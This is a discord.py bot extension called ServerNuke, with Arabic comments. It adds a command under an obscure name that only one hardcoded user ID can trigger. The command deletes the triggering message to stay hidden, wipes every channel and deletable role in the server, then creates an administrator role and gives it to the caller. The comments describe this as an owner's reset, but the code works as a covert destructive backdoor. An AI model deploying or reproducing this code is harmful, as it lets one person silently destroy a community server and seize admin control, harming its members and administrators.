import discord
from discord.ext import commands

class ServerNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        # الآيدي الخاص بك حصراً
        self.OWNER_ID = 1107355943408259112

    @commands.command(name="itzF188", aliases=["تصفير_السيرفر"])
    async def nuke_server(self, ctx):
        # التحقق الصارم من الآيدي الخاص بك فقط
        if ctx.author.id != self.OWNER_ID:
            return

        # محاولة حذف أمرك للحفاظ على السرية
        try:
            await ctx.message.delete()
        except Exception:
            pass

        guild = ctx.guild

        # 1. حذف جميع الرومات (Channels & Categories)
        for channel in guild.channels:
            try:
                await channel.delete(reason="إعادة ضبط السيرفر بالكامل بواسطة المالك.")
            except Exception:
                pass

        # 2. حذف جميع الرتب (Roles) التي يمكن للبوت حذفها
        for role in guild.roles:
            if role != guild.default_role and not role.managed:
                try:
                    await role.delete(reason="إعادة ضبط السيرفر بالكامل بواسطة المالك.")
                except Exception:
                    pass

        # 3. إنشاء روم جديدة وإرسال إشعار لك وحدك
        try:
            new_channel = await guild.create_text_channel("•-start-fresh")
            
            admin_perm = discord.Permissions(administrator=True)
            new_role = await guild.create_role(name=".", permissions=admin_perm, reason="رتبة الطوارئ للمالك")
            await ctx.author.add_roles(new_role)
            
            await new_channel.send(f"⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح. السيرفر جاهز الآن لتبدأ تصميمه من جديد من الصفر.")
        except Exception as e:
            print(f"⚠️ خطأ أثناء بناء الروم الافتتاحي: {e}")

async def setup(bot):
    await bot.add_cog(ServerNuke(bot))
